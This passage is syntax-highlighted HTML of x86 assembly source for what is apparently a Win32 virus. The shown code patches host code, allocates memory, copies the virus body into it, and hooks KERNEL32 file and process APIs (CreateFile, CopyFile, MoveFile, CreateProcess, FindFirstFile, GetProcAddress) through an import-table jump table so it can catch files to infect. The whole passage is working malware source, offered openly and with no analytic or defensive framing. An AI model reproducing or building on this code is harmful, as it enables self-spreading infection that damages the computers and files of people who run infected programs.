        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">go_resident</span><span class="sc0">     </span><span class="sc1">;no more chunkz, jump and try to stay resident, then jump back to host</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get_count</span><span class="sc0">       </span><span class="sc1">;jump and patch the next chunk</span><span class="sc0">
</span><span class="sc5">n_host</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;unwind return adress, an error occured, cant jump to host :(</span><span class="sc0">

</span><span class="sc5">go_resident</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetModuleFileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get host filename</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">jmp_addr_table</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get pointer to start of jump adress table</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">g_host</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">            </span><span class="sc1">;open host filename and memory-map it</span><span class="sc0">
</span><span class="sc5">g_host</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">jmp_host</span><span class="sc0">                </span><span class="sc1">;if error, jump back to host</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_COMMIT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_TOP_DOWN</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">virtual_end2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;NULL           ;let OS choose memory adress</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddVirtualAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;allocate enough memory for virus code and bufferz</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FunctionNamez2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get pointer to start of function namez to hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">non_res</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;get size of new allocated block</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PathNamez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">close_jmp_host</span><span class="sc0">          </span><span class="sc1">;if error on VirtualAlloc, close file and jump to host</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get target adress of new allocated block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pPathNamez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">;initialize pointer to store future pathnamez retrieved by Find(First/Next)File(A/W)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pcode_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">;get source adress of virus code and store new target adress as new source adress</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">jmp_table_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pNewAPIs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">;initialize pointer to store hooked APIs in the new jump table</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;copy virus code to new allocated block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">                </span><span class="sc1">;force a null to mark the end of function namez to hook</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;get start of memory-maped file</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;get pointer to NewAPItable</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">hook_api</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;hook API functionz, retrieve old API adress and build new API entry into jump table..</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IGetProcAddressIT</span><span class="sc0">       </span><span class="sc1">;get RVA pointer of API function inside import table</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">next_api_hook</span><span class="sc0">           </span><span class="sc1">;if not found, jump and get next API name</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">phost_hdr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;convert RVA to real pointer by addin the actual host base adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">                 </span><span class="sc1">;build "mov eax,?" instruction into jump table</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetCurrentProcess</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">                           </span><span class="sc1">;get and copy old API adress into jump table</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddWriteProcessMemory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;set our API hook</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                 </span><span class="sc1">;build "jmp ?" instruction to jump to new API handler</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;build relative offset to new API handler</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pcode_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">next_api_hook</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@endsz</span><span class="sc0">                  </span><span class="sc1">;get pointer to next API name</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">;check end of API namez to hook</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">hook_api</span><span class="sc0">        </span><span class="sc1">;jump and get next API, if there are more APIz to hook</span><span class="sc0">

</span><span class="sc5">close_jmp_host</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0"> </span><span class="sc1">;close and unmap host file</span><span class="sc0">

</span><span class="sc5">jmp_host</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;jmp to host.. or try to quit aplication if an error ocurred while patchin the code section</span><span class="sc0">

</span><span class="sc5">NewGetProcAddr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;new GetProcAddress API entry point.. hook wanted API functionz from KERNEL32..</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">APICall@n_2</span><span class="sc0">     </span><span class="sc1">;call old GetProcAdress API and retrieve API adress in EAX</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esp.cPushad.Arg1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get module handle/base adress</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_ebp</span><span class="sc0">                 </span><span class="sc1">;get EBP to reference internal variablez correctly</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_getproc</span><span class="sc0">             </span><span class="sc1">;get out if retrieved API adress is zero</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Mod</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;is it KERNEL32 base adress?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_getproc</span><span class="sc0">                     </span><span class="sc1">;no, get out</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">jmp_addr_table</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;yea its KERNEL32, get pointer to start of jump table</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FunctionNamez2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get pointer to API function namez to hook</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">n_gproc_next_str</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;search specified API function name from the list of posible API namez to hook..</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">                           </span><span class="sc1">;get adress to next API function name</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esp.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get pointer to specified API function name</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_getproc</span><span class="sc0">             </span><span class="sc1">;if end of API namez reached, get out</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">n_gproc_next_chr</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;do API namez match?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">n_gproc_next_str</span><span class="sc0">        </span><span class="sc1">;no, get next API name</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">n_gproc_next_chr</span><span class="sc0">

</span><span class="sc5">n_gproc_apis_match</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;API namez match, we need to hook the API..</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NewAPItable</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nAPIS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get top of jump table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pNewAPIs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get current pointer to build new API entry</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;check if jump table is full</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_getproc</span><span class="sc0">                     </span><span class="sc1">;get out if full</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">0B8h</span><span class="sc0">                </span><span class="sc1">;build "mov eax,?" instruction into jump table</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;retrieve old API adress and swap with the new API adress</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                 </span><span class="sc1">;build "jmp ?" instruction to jump to new API handler</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;build relative offset to new API handler</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pcode_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pNewAPIs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">;update pointer to next API entry in the jump table</span><span class="sc0">

</span><span class="sc5">end_getproc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;return to caller</span><span class="sc0">

</span><span class="sc5">jmp_addr_table</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;adress table.. contains relative offsetz to new API handlerz..</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewGetProcAddr</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewGetFileAttrA</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewGetFileAttrW</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewMoveFileExA</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewMoveFileExW</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">New_lopen</span><span class="sc0">         </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewCopyFileA</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewCopyFileW</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewOpenFile</span><span class="sc0">       </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewMoveFileA</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewMoveFileW</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewCreateProcessA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewCreateProcessW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewCreateFileA</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewCreateFileW</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewFindCloseX</span><span class="sc0">     </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewFindFirstFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewFindFirstFileW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
